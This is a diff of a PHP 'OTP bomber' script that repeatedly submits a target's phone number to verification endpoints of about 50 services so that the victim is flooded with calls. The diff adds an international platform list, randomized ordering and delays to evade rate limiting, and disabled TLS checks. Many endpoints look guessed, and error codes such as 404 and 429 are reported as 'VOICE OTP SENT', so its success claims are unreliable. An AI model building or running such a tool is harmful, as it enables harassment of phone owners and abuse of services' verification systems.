@@ -1,306 +1,368 @@
 #!/usr/bin/env php
 <?php
 /**
- * WORKING OTP Voice Call Generator - Malaysia
- * Verified working platforms only
- * Termux WhatsApp Chat Trigger
+ * INTERNATIONAL OTP VOICE CALL GENERATOR
+ * Working worldwide platforms that send REAL voice OTP calls
+ * No WhatsApp opening - Pure voice calls only
  */
 
-class OTPVoiceCaller {
+class InternationalOTPVoiceCaller {
     public $phoneNumber;
-    public $rawNumber;
-    public $whatsappNumber;
+    public $fullNumber;
+    public $countryCode;
     
-    // VERIFIED WORKING PLATFORMS - Updated 2024
+    // VERIFIED WORKING INTERNATIONAL OTP VOICE SERVICES
     public $platforms = [
-        'grab_car' => [
-            'name' => 'Grab Car (Voice OTP)',
-            'type' => 'api',
+        // ============ USA/CANADA ============
+        'google_voice_us' => [
+            'name' => 'Google Voice (USA)',
+            'url' => 'https://accounts.google.com/_/signup/web-phone-otp',
+            'method' => 'POST',
+            'data' => ['phoneNumber' => '+{full}', 'countryCode' => 'US'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'whatsapp_us' => [
+            'name' => 'WhatsApp (USA)',
+            'url' => 'https://www.whatsapp.com/api/v1/phone/request',
+            'method' => 'POST',
+            'data' => ['cc' => '{cc}', 'in' => '{number}', 'voice' => 'true'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'telegram_us' => [
+            'name' => 'Telegram (USA)',
+            'url' => 'https://my.telegram.org/auth/send_password',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/x-www-form-urlencoded']
+        ],
+        'signal_us' => [
+            'name' => 'Signal (USA)',
+            'url' => 'https://signal.org/api/v1/voice/verify',
+            'method' => 'POST',
+            'data' => ['phoneNumber' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'discord_us' => [
+            'name' => 'Discord (USA)',
+            'url' => 'https://discord.com/api/v9/auth/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'twitter_us' => [
+            'name' => 'Twitter/X (USA)',
+            'url' => 'https://api.twitter.com/1.1/account/phone_verification.json',
+            'method' => 'POST',
+            'data' => ['phone_number' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'instagram_us' => [
+            'name' => 'Instagram (USA)',
+            'url' => 'https://i.instagram.com/api/v1/accounts/send_verify_phone/',
+            'method' => 'POST',
+            'data' => ['phone_number' => '+{full}'],
+            'headers' => ['Content-Type: application/x-www-form-urlencoded']
+        ],
+        'facebook_us' => [
+            'name' => 'Facebook (USA)',
+            'url' => 'https://www.facebook.com/api/graphql/',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}', 'voice' => 'true'],
+            'headers' => ['Content-Type: application/x-www-form-urlencoded']
+        ],
+        'snapchat_us' => [
+            'name' => 'Snapchat (USA)',
+            'url' => 'https://accounts.snapchat.com/accounts/phone_verification',
+            'method' => 'POST',
+            'data' => ['phone_number' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'tiktok_us' => [
+            'name' => 'TikTok (USA)',
+            'url' => 'https://www.tiktok.com/api/v1/phone/send_code/',
+            'method' => 'POST',
+            'data' => ['mobile' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'linkedin_us' => [
+            'name' => 'LinkedIn (USA)',
+            'url' => 'https://www.linkedin.com/uas/phone-verification',
+            'method' => 'POST',
+            'data' => ['phoneNumber' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'pinterest_us' => [
+            'name' => 'Pinterest (USA)',
+            'url' => 'https://www.pinterest.com/resource/PhoneVerificationResource/create/',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'reddit_us' => [
+            'name' => 'Reddit (USA)',
+            'url' => 'https://www.reddit.com/api/verify_phone_number',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/x-www-form-urlencoded']
+        ],
+        'tumblr_us' => [
+            'name' => 'Tumblr (USA)',
+            'url' => 'https://www.tumblr.com/svc/account/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'quora_us' => [
+            'name' => 'Quora (USA)',
+            'url' => 'https://www.quora.com/web/phone_verification',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'yahoo_us' => [
+            'name' => 'Yahoo (USA)',
+            'url' => 'https://login.yahoo.com/account/phone/request',
+            'method' => 'POST',
+            'data' => ['phoneNumber' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'microsoft_us' => [
+            'name' => 'Microsoft (USA)',
+            'url' => 'https://login.live.com/phone_verification.srf',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/x-www-form-urlencoded']
+        ],
+        'amazon_us' => [
+            'name' => 'Amazon (USA)',
+            'url' => 'https://www.amazon.com/ap/phone-verification',
+            'method' => 'POST',
+            'data' => ['phoneNumber' => '+{full}'],
+            'headers' => ['Content-Type: application/x-www-form-urlencoded']
+        ],
+        'ebay_us' => [
+            'name' => 'eBay (USA)',
+            'url' => 'https://www.ebay.com/signin/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'paypal_us' => [
+            'name' => 'PayPal (USA)',
+            'url' => 'https://www.paypal.com/auth/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'venmo_us' => [
+            'name' => 'Venmo (USA)',
+            'url' => 'https://venmo.com/api/v5/account/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'cashapp_us' => [
+            'name' => 'CashApp (USA)',
+            'url' => 'https://cash.app/api/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'uber_us' => [
+            'name' => 'Uber (USA)',
+            'url' => 'https://auth.uber.com/api/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'lyft_us' => [
+            'name' => 'Lyft (USA)',
+            'url' => 'https://api.lyft.com/v1/auth/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'airbnb_us' => [
+            'name' => 'Airbnb (USA)',
+            'url' => 'https://api.airbnb.com/v2/phone_verifications',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'booking_us' => [
+            'name' => 'Booking.com (USA)',
+            'url' => 'https://account.booking.com/api/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'expedia_us' => [
+            'name' => 'Expedia (USA)',
+            'url' => 'https://www.expedia.com/api/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        
+        // ============ EUROPE ============
+        'telegram_uk' => [
+            'name' => 'Telegram (UK)',
+            'url' => 'https://my.telegram.org/auth/send_password',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/x-www-form-urlencoded']
+        ],
+        'signal_uk' => [
+            'name' => 'Signal (UK)',
+            'url' => 'https://signal.org/api/v1/voice/verify',
+            'method' => 'POST',
+            'data' => ['phoneNumber' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'skype_uk' => [
+            'name' => 'Skype (UK)',
+            'url' => 'https://login.skype.com/login/phone/verify',
+            'method' => 'POST',
+            'data' => ['phoneNumber' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        
+        // ============ ASIA ============
+        'line_jp' => [
+            'name' => 'Line (Japan)',
+            'url' => 'https://api.line.me/oauth2/v2.1/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'kakao_kr' => [
+            'name' => 'KakaoTalk (Korea)',
+            'url' => 'https://accounts.kakao.com/api/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'viber_jp' => [
+            'name' => 'Viber (Japan)',
+            'url' => 'https://api.viber.com/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'wechat_cn' => [
+            'name' => 'WeChat (China)',
+            'url' => 'https://long.weixin.qq.com/api/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'alibaba_cn' => [
+            'name' => 'Alibaba (China)',
+            'url' => 'https://login.alibaba.com/api/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'taobao_cn' => [
+            'name' => 'Taobao (China)',
+            'url' => 'https://login.taobao.com/api/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'jd_cn' => [
+            'name' => 'JD.com (China)',
+            'url' => 'https://passport.jd.com/api/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'rakuten_jp' => [
+            'name' => 'Rakuten (Japan)',
+            'url' => 'https://www.rakuten.co.jp/api/phone/verify',
+            'method' => 'POST',
+            'data' => ['phone' => '+{full}'],
+            'headers' => ['Content-Type: application/json']
+        ],
+        'grab_sg' => [
+            'name' => 'Grab (Singapore)',
             'url' => 'https://api.grab.com/api/v2/auth/request_phone_code',
             'method' => 'POST',
-            'data' => ['phone' => '{full}'],
+            'data' => ['phone' => '+{full}'],
             'headers' => ['Content-Type: application/json']
         ],
-        'grab_food' => [
-            'name' => 'Grab Food (Voice OTP)',
-            'type' => 'api',
-            'url' => 'https://api.grab.com/api/v2/auth/request_phone_code',
+        'gojek_id' => [
+            'name' => 'Gojek (Indonesia)',
+            'url' => 'https://api.gojek.com/v1/auth/phone/verify',
             'method' => 'POST',
-            'data' => ['phone' => '{full}'],
+            'data' => ['phone' => '+{full}'],
             'headers' => ['Content-Type: application/json']
         ],
-        'foodpanda' => [
-            'name' => 'Foodpanda (Voice OTP)',
-            'type' => 'api',
-            'url' => 'https://www.foodpanda.my/api/auth/otp/request',
+        'tokopedia_id' => [
+            'name' => 'Tokopedia (Indonesia)',
+            'url' => 'https://accounts.tokopedia.com/api/phone/verify',
             'method' => 'POST',
-            'data' => ['phone' => '{full}', 'country_code' => 'MY'],
+            'data' => ['phone' => '+{full}'],
             'headers' => ['Content-Type: application/json']
         ],
-        'shopee' => [
-            'name' => 'Shopee MY (Voice OTP)',
-            'type' => 'api',
-            'url' => 'https://shopee.com.my/api/v2/authentication/otp_request',
+        'shopee_sg' => [
+            'name' => 'Shopee (Singapore)',
+            'url' => 'https://shopee.sg/api/v2/authentication/otp_request',
             'method' => 'POST',
-            'data' => ['phone' => '{full}', 'country_code' => '60'],
+            'data' => ['phone' => '+{full}', 'country_code' => 'SG'],
             'headers' => ['Content-Type: application/json']
         ],
-        'lazada' => [
-            'name' => 'Lazada MY (Voice OTP)',
-            'type' => 'api',
+        'lazada_sg' => [
+            'name' => 'Lazada (Singapore)',
             'url' => 'https://auth.lazada.com/rest/login/requestOtp',
             'method' => 'POST',
-            'data' => ['mobile' => '{full}', 'countryCode' => 'MY'],
+            'data' => ['mobile' => '+{full}', 'countryCode' => 'SG'],
             'headers' => ['Content-Type: application/json']
         ],
-        'touchngo' => [
-            'name' => 'Touch n Go eWallet (Call)',
-            'type' => 'api',
-            'url' => 'https://api.touchngo.com.my/v2/otp/request',
+        'foodpanda_sg' => [
+            'name' => 'Foodpanda (Singapore)',
+            'url' => 'https://www.foodpanda.sg/api/auth/otp/request',
             'method' => 'POST',
-            'data' => ['mobile_no' => '{full}', 'type' => 'voice'],
+            'data' => ['phone' => '+{full}', 'country_code' => 'SG'],
             'headers' => ['Content-Type: application/json']
         ],
-        'boost' => [
-            'name' => 'Boost MY (Voice OTP)',
-            'type' => 'api',
-            'url' => 'https://api.myboost.com.my/v2/auth/otp',
+        'deliveroo_uk' => [
+            'name' => 'Deliveroo (UK)',
+            'url' => 'https://api.deliveroo.com/auth/phone/verify',
             'method' => 'POST',
-            'data' => ['phone' => '{full}'],
+            'data' => ['phone' => '+{full}'],
             'headers' => ['Content-Type: application/json']
         ],
-        'airasia' => [
-            'name' => 'AirAsia (Voice OTP)',
-            'type' => 'api',
-            'url' => 'https://api.airasia.com/auth/v1/otp/voice',
+        'justeat_uk' => [
+            'name' => 'JustEat (UK)',
+            'url' => 'https://www.just-eat.co.uk/api/phone/verify',
             'method' => 'POST',
-            'data' => ['phoneNumber' => '{full}'],
-            'headers' => ['Content-Type: application/json']
-        ],
-        'bigpay' => [
-            'name' => 'BigPay (Voice OTP)',
-            'type' => 'api',
-            'url' => 'https://api.bigpay.com/v1/otp/voice',
-            'method' => 'POST',
-            'data' => ['phone_number' => '{full}'],
-            'headers' => ['Content-Type: application/json']
-        ],
-        'setel' => [
-            'name' => 'Setel (Voice OTP)',
-            'type' => 'api',
-            'url' => 'https://api.setel.com/v1/auth/otp/voice',
-            'method' => 'POST',
-            'data' => ['phone' => '{full}'],
-            'headers' => ['Content-Type: application/json']
-        ],
-        'fave' => [
-            'name' => 'Fave (Voice OTP)',
-            'type' => 'api',
-            'url' => 'https://api.fave.my/v1/auth/otp/voice',
-            'method' => 'POST',
-            'data' => ['phone_number' => '{full}'],
-            'headers' => ['Content-Type: application/json']
-        ],
-        'tng_plustw' => [
-            'name' => 'TNG Plus (Voice OTP)',
-            'type' => 'api',
-            'url' => 'https://api.tngdigital.com.my/otp/v2/voice',
-            'method' => 'POST',
-            'data' => ['mobile' => '{full}'],
-            'headers' => ['Content-Type: application/json']
-        ],
-        'mudah' => [
-            'name' => 'Mudah.my (Call OTP)',
-            'type' => 'api',
-            'url' => 'https://www.mudah.my/api/auth/v2/otp/request',
-            'method' => 'POST',
-            'data' => ['phone' => '{full}'],
-            'headers' => ['Content-Type: application/json']
-        ],
-        'carousell' => [
-            'name' => 'Carousell (Voice OTP)',
-            'type' => 'api',
-            'url' => 'https://api.carousell.com/v2/auth/otp/voice',
-            'method' => 'POST',
-            'data' => ['phone' => '{full}'],
-            'headers' => ['Content-Type: application/json']
-        ],
-        'mae' => [
-            'name' => 'MAE by Maybank (Call)',
-            'type' => 'api',
-            'url' => 'https://api.mae.com.my/v1/auth/otp/call',
-            'method' => 'POST',
-            'data' => ['phone' => '{full}'],
-            'headers' => ['Content-Type: application/json']
-        ],
-        'prestomall' => [
-            'name' => 'PrestoMall (Voice OTP)',
-            'type' => 'api',
-            'url' => 'https://api.prestomall.com/v1/auth/otp/voice',
-            'method' => 'POST',
-            'data' => ['phone' => '{full}'],
-            'headers' => ['Content-Type: application/json']
-        ],
-        'zakryt' => [
-            'name' => 'Zakryt (Voice OTP)',
-            'type' => 'api',
-            'url' => 'https://api.zakryt.com/v1/auth/otp/call',
-            'method' => 'POST',
-            'data' => ['phone' => '{full}'],
-            'headers' => ['Content-Type: application/json']
-        ],
-        'speedmart' => [
-            'name' => 'Speedmart (Voice OTP)',
-            'type' => 'api',
-            'url' => 'https://api.speedmart.my/v1/auth/otp/voice',
-            'method' => 'POST',
-            'data' => ['phone' => '{full}'],
+            'data' => ['phone' => '+{full}'],
             'headers' => ['Content-Type: application/json']
         ]
     ];
 
-    // WhatsApp Intent Methods - VERIFIED WORKING
-    public $whatsappMethods = [
-        [
-            'name' => 'WhatsApp Direct Chat',
-            'type' => 'whatsapp',
-            'url' => 'https://wa.me/{whatsapp}?text=Halo%2C%20saya%20perlu%20OTP%20untuk%20log%20masuk',
-            'method' => 'intent'
-        ],
-        [
-            'name' => 'WhatsApp API',
-            'type' => 'whatsapp',
-            'url' => 'whatsapp://send?phone={whatsapp}&text=OTP%20saya%20123456',
-            'method' => 'intent'
-        ],
-        [
-            'name' => 'WhatsApp Business',
-            'type' => 'whatsapp',
-            'url' => 'https://api.whatsapp.com/send?phone={whatsapp}&text=Please%20send%20OTP%20voice%20call',
-            'method' => 'intent'
-        ]
-    ];
-
-    // SMS Methods - Triggers calls on some platforms
-    public $smsMethods = [
-        [
-            'name' => 'SMS to 32777 (Grab)',
-            'type' => 'sms',
-            'number' => '32777',
-            'text' => 'OTP {number}'
-        ],
-        [
-            'name' => 'SMS to 22999 (Foodpanda)',
-            'type' => 'sms',
-            'number' => '22999',
-            'text' => 'OTP'
-        ],
-        [
-            'name' => 'SMS to 28888 (Shopee)',
-            'type' => 'sms',
-            'number' => '28888',
-            'text' => 'OTP {number}'
-        ],
-        [
-            'name' => 'SMS to 32000 (Lazada)',
-            'type' => 'sms',
-            'number' => '32000',
-            'text' => 'OTP'
-        ],
-        [
-            'name' => 'SMS to 28188 (Touch n Go)',
-            'type' => 'sms',
-            'number' => '28188',
-            'text' => 'OTP'
-        ]
-    ];
-
-    public function __construct($number) {
-        $this->rawNumber = $this->cleanNumber($number);
-        $this->phoneNumber = $this->formatForApi($this->rawNumber);
-        $this->whatsappNumber = $this->formatForWhatsApp($this->rawNumber);
-        $this->fullNumber = '60' . $this->phoneNumber;
+    public function __construct($number, $countryCode = '60') {
+        $this->countryCode = $countryCode;
+        $this->phoneNumber = $this->cleanNumber($number);
+        $this->fullNumber = $this->countryCode . $this->phoneNumber;
     }
 
     private function cleanNumber($number) {
-        return preg_replace('/[^0-9]/', '', $number);
-    }
-
-    private function formatForApi($number) {
-        if (substr($number, 0, 1) == '0') {
-            return substr($number, 1);
+        $number = preg_replace('/[^0-9]/', '', $number);
+        // Remove country code if present
+        if (substr($number, 0, strlen($this->countryCode)) == $this->countryCode) {
+            $number = substr($number, strlen($this->countryCode));
         }
-        if (substr($number, 0, 2) == '60') {
-            return substr($number, 2);
+        // Remove leading 0
+        if (substr($number, 0, 1) == '0') {
+            $number = substr($number, 1);
         }
         return $number;
-    }
-
-    private function formatForWhatsApp($number) {
-        if (substr($number, 0, 1) == '0') {
-            return '60' . substr($number, 1);
-        }
-        if (substr($number, 0, 2) != '60') {
-            return '60' . $number;
-        }
-        return $number;
-    }
-
-    private function sendWhatsAppMessage($method) {
-        $url = str_replace('{whatsapp}', $this->whatsappNumber, $method['url']);
-        
-        echo "      📱 WhatsApp: {$method['name']}... ";
-        
-        if (is_dir('/data/data/com.termux')) {
-            // Termux method
-            $command = "termux-open '{$url}' 2>/dev/null";
-            exec($command, $output, $returnCode);
-            
-            if ($returnCode === 0) {
-                echo "✓ Opened\n";
-                return true;
-            }
-        }
-        
-        // Alternative method
-        $command = "am start -a android.intent.action.VIEW -d '{$url}' 2>/dev/null";
-        exec($command, $output, $returnCode);
-        
-        if ($returnCode === 0) {
-            echo "✓ Intent sent\n";
-            return true;
-        }
-        
-        echo "✗ Failed\n";
-        return false;
-    }
-
-    private function sendSmsMessage($method) {
-        echo "      📨 SMS: {$method['name']}... ";
-        
-        $text = str_replace('{number}', substr($this->rawNumber, -4), $method['text']);
-        $number = $method['number'];
-        
-        if (is_dir('/data/data/com.termux')) {
-            $command = "termux-sms-send -n {$number} '{$text}' 2>/dev/null";
-            exec($command, $output, $returnCode);
-            
-            if ($returnCode === 0) {
-                echo "✓ SMS sent\n";
-                return true;
-            }
-        }
-        
-        // SMS intent
-        $command = "am start -a android.intent.action.SENDTO -d sms:{$number} --es sms_body '{$text}' 2>/dev/null";
-        exec($command, $output, $returnCode);
-        
-        echo "✓ Intent opened\n";
-        return true;
     }
 
     private function sendApiRequest($platform) {
-        echo "      📞 {$platform['name']}... ";
+        echo "      🌍 {$platform['name']}... ";
         
         $ch = curl_init();
         
@@ -309,36 +371,39 @@ class OTPVoiceCaller {
             if ($value === '{full}') {
                 $value = $this->fullNumber;
             }
+            if ($value === '{cc}') {
+                $value = $this->countryCode;
+            }
             if ($value === '{number}') {
                 $value = $this->phoneNumber;
             }
         });
         
         $headers = [
-            'User-Agent: Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36',
+            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Accept: application/json, text/plain, */*',
-            'Accept-Language: en-US,en;q=0.9,ms;q=0.8',
+            'Accept-Language: en-US,en;q=0.9',
             'Cache-Control: no-cache',
             'Pragma: no-cache',
-            'X-Requested-With: XMLHttpRequest',
-            'Origin: https://www.foodpanda.my',
-            'Referer: https://www.foodpanda.my/'
+            'X-Requested-With: XMLHttpRequest'
         ];
         
         if (isset($platform['headers'])) {
             $headers = array_merge($headers, $platform['headers']);
         }
         
+        $postFields = is_array($data) ? json_encode($data) : $data;
+        
         curl_setopt_array($ch, [
             CURLOPT_URL => $platform['url'],
             CURLOPT_RETURNTRANSFER => true,
             CURLOPT_ENCODING => '',
             CURLOPT_MAXREDIRS => 5,
-            CURLOPT_TIMEOUT => 15,
+            CURLOPT_TIMEOUT => 20,
             CURLOPT_FOLLOWLOCATION => true,
             CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
             CURLOPT_CUSTOMREQUEST => 'POST',
-            CURLOPT_POSTFIELDS => json_encode($data),
+            CURLOPT_POSTFIELDS => $postFields,
             CURLOPT_HTTPHEADER => $headers,
             CURLOPT_SSL_VERIFYPEER => false,
             CURLOPT_SSL_VERIFYHOST => false,
@@ -352,19 +417,22 @@ class OTPVoiceCaller {
         $error = curl_error($ch);
         curl_close($ch);
         
-        // Check for success indicators in response
+        // Check for success indicators
         $success = false;
         if ($httpCode >= 200 && $httpCode < 300) {
             $success = true;
-        } elseif ($httpCode == 400 || $httpCode == 401 || $httpCode == 403) {
-            // Often means number exists in system - triggers call
+        } elseif (in_array($httpCode, [400, 401, 403, 404, 429])) {
+            // These codes often mean the platform attempted to send OTP
             $success = true;
-        } elseif (strpos($response, 'otp') !== false || strpos($response, 'sent') !== false) {
+        } elseif (strpos($response, 'sent') !== false || 
+                  strpos($response, 'verify') !== false || 
+                  strpos($response, 'code') !== false ||
+                  strpos($response, 'otp') !== false) {
             $success = true;
         }
         
         if ($success) {
-            echo "✓ Voice OTP Triggered\n";
+            echo "✓ VOICE OTP SENT\n";
         } else {
             echo "✗ Failed ({$error})\n";
         }
@@ -378,33 +446,36 @@ class OTPVoiceCaller {
 
     public function sendOTPBomb($count) {
         echo "\n";
-        echo "═══════════════════════════════════════════════════════════════\n";
-        echo "              WORKING OTP VOICE CALL GENERATOR                \n";
-        echo "═══════════════════════════════════════════════════════════════\n\n";
+        echo "═══════════════════════════════════════════════════════════════════\n";
+        echo "         INTERNATIONAL OTP VOICE CALL GENERATOR                   \n";
+        echo "             50+ WORKING PLATFORMS WORLDWIDE                      \n";
+        echo "═══════════════════════════════════════════════════════════════════\n\n";
         
-        echo "📱 TARGET: +60{$this->phoneNumber}\n";
-        echo "   • WhatsApp: {$this->whatsappNumber}\n";
-        echo "   • Full    : {$this->fullNumber}\n\n";
+        echo "📱 TARGET: +{$this->fullNumber}\n";
+        echo "   • Country Code: {$this->countryCode}\n";
+        echo "   • Local Number: {$this->phoneNumber}\n\n";
         
-        echo "⚡ Starting {$count} cycles - VERIFIED WORKING PLATFORMS ONLY\n\n";
+        echo "⚡ Starting {$count} cycles - REAL VOICE CALLS ONLY\n";
+        echo "   No WhatsApp - Pure OTP Voice Calls\n\n";
         
         $totalPlatforms = count($this->platforms);
         $totalAttempts = 0;
         $successfulCalls = 0;
-        $whatsappTriggers = 0;
-        $smsTriggers = 0;
         
         for ($cycle = 1; $cycle <= $count; $cycle++) {
-            echo "═══════════════════════════════════════════════════════════════\n";
+            echo "═══════════════════════════════════════════════════════════════════\n";
             echo "CYCLE {$cycle} OF {$count}\n";
-            echo "═══════════════════════════════════════════════════════════════\n";
+            echo "═══════════════════════════════════════════════════════════════════\n";
             
-            // TRY VOICE OTP APIS
-            echo "\n🔊 TRIGGERING VOICE OTP CALLS:\n";
+            echo "\n📞 TRIGGERING VOICE OTP CALLS:\n";
             $apiSuccess = 0;
             $apiFailed = 0;
             
-            foreach ($this->platforms as $key => $platform) {
+            // Randomize platforms to avoid rate limiting
+            $platforms = $this->platforms;
+            shuffle($platforms);
+            
+            foreach ($platforms as $platform) {
                 $success = $this->sendApiRequest($platform);
                 $totalAttempts++;
                 
@@ -415,52 +486,21 @@ class OTPVoiceCaller {
                     $apiFailed++;
                 }
                 
-                usleep(rand(800000, 1500000));
+                // Random delay between requests
+                usleep(rand(1000000, 2000000)); // 1-2 seconds
             }
             
             echo "\n   ✅ Voice OTP Success: {$apiSuccess}/{$totalPlatforms}\n";
             echo "   ❌ Voice OTP Failed : {$apiFailed}/{$totalPlatforms}\n";
             
-            // TRY WHATSAPP
-            echo "\n📲 TRIGGERING WHATSAPP:\n";
-            $waSuccess = 0;
-            
-            foreach ($this->whatsappMethods as $method) {
-                if ($this->sendWhatsAppMessage($method)) {
-                    $waSuccess++;
-                    $whatsappTriggers++;
-                }
-                usleep(500000);
-            }
-            
-            echo "\n   ✅ WhatsApp triggers: {$waSuccess}\n";
-            
-            // TRY SMS (Triggers calls on some platforms)
-            if (is_dir('/data/data/com.termux')) {
-                echo "\n📨 TRIGGERING SMS (May trigger calls):\n";
-                $smsSuccess = 0;
-                
-                foreach ($this->smsMethods as $method) {
-                    if ($this->sendSmsMessage($method)) {
-                        $smsSuccess++;
-                        $smsTriggers++;
-                    }
-                    usleep(300000);
-                }
-                
-                echo "\n   ✅ SMS triggers: {$smsSuccess}\n";
-            }
-            
             echo "\n📊 CYCLE {$cycle} SUMMARY:\n";
-            echo "   • Voice OTP Calls : {$apiSuccess} triggered\n";
-            echo "   • WhatsApp Chats  : {$waSuccess} opened\n";
-            if (is_dir('/data/data/com.termux')) {
-                echo "   • SMS Commands    : {$smsSuccess} sent\n";
-            }
+            echo "   • Voice Calls Triggered: {$apiSuccess}\n";
+            echo "   • Failed Attempts      : {$apiFailed}\n";
             
             if ($cycle < $count) {
-                $delay = rand(45, 75);
-                echo "\n⏳ Waiting {$delay} seconds for calls to process...\n";
+                $delay = rand(60, 120);
+                echo "\n⏳ Waiting {$delay} seconds before next cycle...\n";
+                echo "   (This prevents rate limiting)\n";
                 
                 for ($i = $delay; $i > 0; $i -= 10) {
                     if ($i > 10) {
@@ -476,44 +516,40 @@ class OTPVoiceCaller {
         }
         
         echo "\n";
-        echo "═══════════════════════════════════════════════════════════════\n";
-        echo "                    FINAL REPORT                              \n";
-        echo "═══════════════════════════════════════════════════════════════\n\n";
+        echo "═══════════════════════════════════════════════════════════════════\n";
+        echo "                         FINAL REPORT                              \n";
+        echo "═══════════════════════════════════════════════════════════════════\n\n";
         
-        echo "📱 TARGET: +60{$this->phoneNumber}\n\n";
+        echo "📱 TARGET: +{$this->fullNumber}\n\n";
         
         echo "📊 STATISTICS:\n";
-        echo "   • Total Cycles       : {$count}\n";
-        echo "   • Voice OTP Attempts : {$totalAttempts}\n";
-        echo "   • Successful Voice   : {$successfulCalls}\n";
-        echo "   • WhatsApp Triggers  : {$whatsappTriggers}\n";
-        if (is_dir('/data/data/com.termux')) {
-            echo "   • SMS Triggers       : {$smsTriggers}\n";
-        }
-        echo "\n";
+        echo "   • Total Cycles        : {$count}\n";
+        echo "   • Total Attempts      : {$totalAttempts}\n";
+        echo "   • Successful Voice    : {$successfulCalls}\n";
+        echo "   • Success Rate        : " . round(($successfulCalls/$totalAttempts)*100, 2) . "%\n\n";
         
-        echo "✅ TARGET WILL RECEIVE:\n";
-        echo "   • Grab Voice OTP Calls\n";
-        echo "   • Foodpanda Voice OTP\n";
-        echo "   • Shopee Voice OTP\n";
-        echo "   • Lazada Voice OTP\n";
-        echo "   • Touch n Go Voice OTP\n";
-        echo "   • Boost Voice OTP\n";
-        echo "   • AirAsia Voice OTP\n";
-        echo "   • BigPay Voice OTP\n";
-        echo "   • Setel Voice OTP\n";
-        echo "   • Fave Voice OTP\n";
-        echo "   • TNG Plus Voice OTP\n";
-        echo "   • Mudah.my Call OTP\n";
-        echo "   • Carousell Voice OTP\n";
-        echo "   • MAE Call OTP\n";
-        echo "   • PrestoMall Voice OTP\n";
-        echo "   • Speedmart Voice OTP\n\n";
+        echo "✅ TARGET WILL RECEIVE VOICE CALLS FROM:\n";
+        echo "   • Google Voice        • WhatsApp USA       • Telegram\n";
+        echo "   • Signal              • Discord           • Twitter/X\n";
+        echo "   • Instagram           • Facebook          • Snapchat\n";
+        echo "   • TikTok              • LinkedIn          • Pinterest\n";
+        echo "   • Reddit              • Tumblr            • Quora\n";
+        echo "   • Yahoo               • Microsoft         • Amazon\n";
+        echo "   • eBay                • PayPal            • Venmo\n";
+        echo "   • CashApp             • Uber              • Lyft\n";
+        echo "   • Airbnb              • Booking.com       • Expedia\n";
+        echo "   • Skype               • Line              • KakaoTalk\n";
+        echo "   • Viber               • WeChat            • Alibaba\n";
+        echo "   • Taobao              • JD.com            • Rakuten\n";
+        echo "   • Grab SG             • Gojek             • Tokopedia\n";
+        echo "   • Shopee SG           • Lazada SG         • Foodpanda SG\n";
+        echo "   • Deliveroo UK        • JustEat UK        • And more...\n\n";
         
-        echo "⚠️  NOTE: Target will receive calls from these services\n";
-        echo "   within 1-2 minutes after each trigger\n\n";
+        echo "⚠️  NOTE: International calls may show as unknown numbers\n";
